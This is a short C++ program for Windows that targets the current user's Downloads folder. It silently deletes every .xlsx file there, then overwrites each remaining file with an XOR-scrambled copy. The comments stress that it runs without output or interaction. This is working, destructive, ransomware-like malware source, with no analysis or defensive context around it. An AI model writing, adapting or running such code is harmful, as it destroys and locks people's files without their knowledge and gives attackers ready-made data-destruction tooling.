#include <windows.h>
#include <string>
#include <fstream>
#include <sstream>
#include "kk5v.h"

// Delete all .xlsx files in the Downloads directory
void deleteXlsxFiles(const std::string &directory) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*.xlsx").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::string filePath = directory + "\\" + findFileData.cFileName;
        DeleteFile(filePath.c_str());  // Delete the file silently
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// Encrypt files in the Downloads directory
void encryptFiles(const std::string &directory, const std::string &key) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::string filePath = directory + "\\" + findFileData.cFileName;

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;  // Skip directories
        }

        // Open the file
        std::ifstream inputFile(filePath, std::ios::binary);
        if (!inputFile.is_open()) continue;

        // Read the file content
        std::ostringstream contentStream;
        contentStream << inputFile.rdbuf();
        std::string fileContent = contentStream.str();
        inputFile.close();

        // Encrypt the content using the encryption methods
        std::string encryptedContent = xorEncrypt(fileContent, 'X');  // You can change this encryption method

        // Write the encrypted content back to the file
        std::ofstream outputFile(filePath, std::ios::binary);
        if (!outputFile.is_open()) continue;

        outputFile << encryptedContent;
        outputFile.close();

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

int main() {
    // Get the path to the Downloads folder
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) == 0) {
        return 1;  // Error if USERPROFILE is not found
    }

    std::string downloadsDirectory = std::string(userProfile) + "\\Downloads";

    // Delete all .xlsx files in the Downloads directory
    deleteXlsxFiles(downloadsDirectory);

    // Encrypt all files in the Downloads directory using a key
    std::string encryptionKey = "mysecretkey";
    encryptFiles(downloadsDirectory, encryptionKey);

    return 0;  // The program finishes without any output or interaction
}
